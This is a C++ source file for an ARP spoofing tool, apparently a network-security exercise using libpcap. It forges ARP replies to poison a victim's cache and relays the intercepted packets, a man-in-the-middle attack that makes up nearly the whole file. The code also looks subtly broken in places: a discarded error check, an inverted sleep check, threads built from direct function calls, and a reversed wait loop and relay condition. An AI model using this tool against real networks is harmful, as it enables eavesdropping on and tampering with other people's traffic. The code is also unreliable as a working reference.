#include "arp-spoof.hpp"

/*
 * Get Attacker's local MAC address and IP address
 * get MAC address in system direstory
 * get IP address using socket and I/O control
*/
bool getMyInfo(const std::string& interface, Mac& MAC, IPv4& IP) {
    int sockfd;
    struct ifreq ifr;

    // struct initialization
    memset(&ifr, 0, sizeof(struct ifreq));

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'getMyInfo'\n";
#endif

    // Find local MAC address ==================================================
    std::ifstream iface("/sys/class/net/" + interface + "/address");
    std::string tempMAC((std::istreambuf_iterator<char>(iface)), 
                        std::istreambuf_iterator<char>());

    if(tempMAC.length() == 0) {
        std::cerr << GET_MAC_ERROR_MSG;
        return false;
    }

    MAC = Mac(tempMAC);
    // =========================================================================

    // Find Local IP address ===================================================
    // Make socket which domain is IPv4 and type is UDP
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    if(sockfd == -1) {
        std::cerr << CREATE_SOCKET_ERROR_MSG;
        return false;
    }


#ifdef DEBUG
    std::cout << "[DEBUG] Successfully open socket\n";
#endif
    // Set protocol to IPv4
    ifr.ifr_addr.sa_family = AF_INET;

    // Put interface name to ifreq
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);

    // IO control to get MAC
    if(ioctl(sockfd, SIOCGIFADDR, &ifr)) {
        std::cerr << IOCTL_ERROR_MSG;
        return false;
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully process ioctl\n";
#endif
    // Only one use and deep copy, so don't have to use inet_ntop 
    IP = IPv4(inet_ntoa(((sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    // Socket close
    if(close(sockfd)) {
        std::cerr << CLOSE_ERROR_MSG;
        return false;
    }
    // =========================================================================

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully close file descriptor\n";
#endif

    return true;
}

/*
 * resolve MAC address by IP using ARP request
 * Use sendPacketARP function to send packet
 * Input  : pcap, IP, myMAC, myIP
 * Output : MAC
 * Add map to check already known MAC address
*/
bool resolveMACByIP(pcap_t* pcap, 
                    Mac& MAC, const IPv4& IP, 
                    const Mac& myMAC, const IPv4& myIP) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res, idx;

    std::map<IPv4, Mac>::iterator it;
    struct ArpHdr* ARPHeaderPtr;

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'getMACByIP'\n";
#endif

    // If there exists matching MAC, return it
    it = attackerARPTable.find(IP);
    if(it != attackerARPTable.end()) {
        MAC = it->second;
        return true;
    }

    // send ARP packet
    // *** need to send repeatedly until receiving correct reply packet(Use thread!!) ***
    mutex4Flag.lock();
    endFlag.push_back({0, 0});
    idx = endFlag.size() - 1;
    mutex4Flag.unlock();

    std::thread sender(sendARPPacketRepeatedly, 
                       pcap, 
                       Mac::broadcastMac(), myMAC, 
                       myMAC, myIP, 
                       Mac::nullMac(), IP, 
                       ArpHdr::Request, idx);

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully send request packet\n";
#endif

    // receive ARP reply from gateway
    while( true ) {
        res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
		// PCAP_ERROR : When interface is down
		if (res == PCAP_ERROR or res == PCAP_ERROR_BREAK) {
			std::cout << PCAP_RECEIVE_PACKET_ERROR;
			std::cout << pcap_geterr(pcap) << std::endl;

			break;
		}
		
		if(packet == NULL) continue;

        // Receive ARP packet, so check if it is response of our request!
        ARPHeaderPtr = (struct ArpHdr*)(packet + sizeof(struct EthHdr));

        if(ArpHdr::Reply == ARPHeaderPtr->op()   and 
           myIP          == ARPHeaderPtr->tip()  and 
           myMAC         == ARPHeaderPtr->tmac() and 
           IP            == ARPHeaderPtr->sip()) {
            // signal to sender thread it is no longer need to send packet
            endFlag[idx].mainFlag = true;
            break;
        }
    }

    // Deep copy from ARPHeader to MAC
    // Add [IP, MAC] pair to attackerARPTable
    mutex4Map.lock();
    attackerARPTable[IP] = MAC = ARPHeaderPtr->smac();
    mutex4Map.unlock();

    endFlag[idx].mainFlag = true;
    sender.join();

    return true;
}

void ARPpacketConstructor(EthArpPacket& packet, 
                          const Mac& destMAC, const Mac& sourceMAC, 
                          const Mac& sendMAC, const IPv4& sendIP,
                          const Mac& targetMAC, const IPv4& targetIP,
                          const ArpHdr::Mode ARPMode = ArpHdr::Mode::Request) {
    // Set Ethernet header
    packet.eth_.dmac_ = destMAC;
	packet.eth_.smac_ = sourceMAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

    // Set ARP Header
    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ipv4);
    packet.arp_.hln_  = Mac::SIZE;
    packet.arp_.pln_  = IPv4::SIZE;
    packet.arp_.op_   = htons(ARPMode);
    packet.arp_.smac_ = sendMAC;
    packet.arp_.sip_  = htonl(sendIP);
    packet.arp_.tmac_ = targetMAC;
    packet.arp_.tip_  = htonl(targetIP);
}

/*
 * Send one packet using pcap
 * Use pcap_sendpacket to send packet ARP packet
*/
bool sendPacket(pcap_t* pcap, const EthArpPacket& packet) {
    if(pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket))) {
        std::cerr << SEND_PACKET_ERROR_MSG;
        std::cerr << pcap_geterr(pcap) << std::endl;
        
        return false;
    }

    return true;
}

bool sendPacket(pcap_t* pcap, const uint8_t* packet, const int packetLength) {
    if(pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(packet), packetLength)) {
        std::cerr << SEND_PACKET_ERROR_MSG;
        std::cerr << pcap_geterr(pcap) << std::endl;
        
        return false;
    }

    return true;
}

/*
 * Send ARP packet using pcap
 * send packet repeatedly until end flag turns true
*/
bool sendARPPacketRepeatedly(pcap_t* pcap, 
                            const Mac& destMAC, const Mac& sourceMAC,
                            const Mac& sendMAC, const IPv4& sendIP, 
                            const Mac& targetMAC, const IPv4& targetIP, 
                            const ArpHdr::Mode mode, const int idx) {
    EthArpPacket packet;

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'sendPacketARP'\n";
    std::cout << "[DEBUG] sourceMAC      : " << std::string(sourceMAC) << '\n';
    std::cout << "[DEBUG] destinationMAC : " << std::string(destMAC) << '\n';
    std::cout << "[DEBUG] sendMAC        : " << std::string(sendMAC) << '\n';
    std::cout << "[DEBUG] targetMAC      : " << std::string(targetMAC) << '\n';
    std::cout << "[DEBUG] sendIP         : " << std::string(sendIP) << '\n';
    std::cout << "[DEBUG] targetIP       : " << std::string(targetIP) << '\n';
#endif

    ARPpacketConstructor(packet, 
                         destMAC, sourceMAC, 
                         sendMAC, sendIP, targetMAC, targetIP, 
                         mode);

    // Send until endFlag goes true
    while( true ) {
        if(endFlag[idx].mainFlag) break;

        if(not sendPacket(pcap, packet)) false;

        if(not sleep(3)) {
            std::cerr << SLEEP_ERROR_MSG;
            return false;
        }
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully send packet\n";
#endif
    
    // for main thread to check whether it is cleared
    endFlag[idx].threadFlag = true;

    return true;
}

/*
 * manage packets from sender and target
 * pcap : for receive and send packet
 * sendMAC : MAC address of sender
 * sendIP : IP address of sender
 * targetMAC : MAC address of target
 * targetIP : IP address of target
*/
bool managePackets(pcap_t* pcap, const Mac& myMAC,
                   const Mac& sendMAC, const IPv4& sendIP, 
                   const Mac& targetMAC, const IPv4& targetIP, 
                   const int idx) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    struct ArpHdr* ARPHeaderPtr;
    struct EthHdr* EthHeaderPtr;
    EthArpPacket packet4Send;

    while( true ) {
        if(endFlag[idx].mainFlag) break;

        res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
		// PCAP_ERROR : When interface is down
		if (res == PCAP_ERROR or res == PCAP_ERROR_BREAK) {
			std::cout << PCAP_RECEIVE_PACKET_ERROR;
			std::cout << pcap_geterr(pcap) << std::endl;

			break;
		}
        
        // Construct fake ARP_REP packet in advance
        ARPpacketConstructor(packet4Send, 
                             sendMAC, myMAC, 
                             myMAC, targetIP, sendMAC, sendIP, 
                             ArpHdr::Reply);
		
		if(packet == NULL) continue;

        // There is four types of packet
        // 1. ARP_REQ from sender by broadcast
        // 2. ARP_REQ from target by broadcast
        // 3. ARP_REQ from sender by unique request
        // 4. IP packet from sender to target

        // Check whether its protocol is ARP or IP
        EthHeaderPtr = (struct EthHdr*)packet;

        // Case of 1, 2, 3
        if(EthHeaderPtr->type() == EthHdr::Arp) {
            // check where this packet came from
            ARPHeaderPtr = (struct ArpHdr*)(packet + sizeof(struct EthHdr));

            if((ARPHeaderPtr->sip() == sendIP and ARPHeaderPtr->tip() == targetIP) or   // Case 1, 3
               (ARPHeaderPtr->sip() == targetIP and ARPHeaderPtr->tip() == sendIP)) {   // Case 2
                // Send ARP_REPLY to sender after a bit of delay
                // Our packet have to reach sender after the target's packet arrives
                usleep(10);

                sendPacket(pcap, packet4Send);
            }
        }

        // Case of 4
        else if(EthHeaderPtr->type() == EthHdr::Ipv4 and 
                EthHeaderPtr->dmac() == targetMAC) {
            // Relay packet
            EthHeaderPtr->smac_ = myMAC;
            EthHeaderPtr->dmac_ = targetMAC;

            sendPacket(pcap, packet, header->len);
        }
    }
    
    endFlag[idx].threadFlag = true;

    return true;
}

/*
 * print information of Attacker, sender, and target
*/
void printInfo(const Mac& myMAC, const IPv4& myIP, 
               const Mac& sendMAC, const IPv4& sendIP, 
               const Mac& targetMAC, const IPv4& targetIP) {
    std::cout << "========================================\n"; 
    std::cout << "[[Attacker's Info]]\n"; 
    std::cout << "[MAC] " << std::string(myMAC) << '\n';
    std::cout << "[IP] " << std::string(myIP) << '\n';
    std::cout << "========================================\n"; 
    std::cout << "[[Sender's Info]]\n"; 
    std::cout << "[MAC] " << std::string(sendMAC) << '\n'; 
    std::cout << "[IP] " << std::string(sendIP) << '\n'; 
    std::cout << "========================================\n"; 
    std::cout << "[[Target's Info]]\n";
    std::cout << "[MAC] " << std::string(targetMAC) << '\n'; 
    std::cout << "[IP] " << std::string(targetIP) << '\n'; 
    std::cout << "========================================\n";
}

bool attackARP(pcap_t* pcap, 
               const Mac& myMAC, const IPv4& myIP,
               const Mac& sendMAC, const IPv4& sendIP, 
               const Mac& targetMAC, const IPv4& targetIP,
               const int idx) {
    int sendIdx, manageIdx;
    
    // send fake ARP packet periodically
    mutex4Flag.lock();
    endFlag.push_back({0, 0});
    sendIdx = endFlag.size() - 1;
    mutex4Flag.unlock();

    std::thread periodSender(sendARPPacketRepeatedly(
        pcap, 
        sendMAC, myMAC, 
        myMAC, targetIP, sendMAC, sendIP, 
        ArpHdr::Reply, sendIdx
    ));

    mutex4Flag.lock();
    endFlag.push_back({0, 0});
    manageIdx = endFlag.size() - 1;
    mutex4Flag.unlock();

    // manage packet
    std::thread managerThread(managePackets(pcap, myMAC, sendMAC, sendIP, targetMAC, targetIP, manageIdx));

    // sleep until caller wants to end function
    while(endFlag[idx].mainFlag) usleep(100000);

    endFlag[sendIdx].mainFlag = true;
    endFlag[manageIdx].mainFlag = true;

    periodSender.join();
    managerThread.join();

    endFlag[idx].threadFlag = true;

    return true;
}
